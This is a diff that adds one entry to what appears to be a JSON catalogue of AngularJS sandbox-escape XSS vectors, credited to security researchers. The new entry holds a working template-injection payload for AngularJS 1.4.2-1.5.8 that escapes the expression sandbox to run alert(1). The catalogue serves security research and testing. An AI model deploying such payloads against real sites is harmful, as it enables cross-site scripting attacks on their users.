@@ -360,6 +360,26 @@
         "csp": false
     },
     {
+        "versionRange": "1.4.2-1.5.8",
+        "version": "1.5.0",
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            },
+            {
+                "name": "Daniel Kachakil",
+                "company": "Anvil Ventures",
+                "twitterUrl": "https:\/\/twitter.com\/kachakil"
+            }
+        ],
+        "vector": "{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'",
+        "hash": "",
+        "type": "dom",
+        "csp": false
+    },
+    {
         "versionRange": ">=1.6.0",
         "version": "1.6.0",
         "authors": [
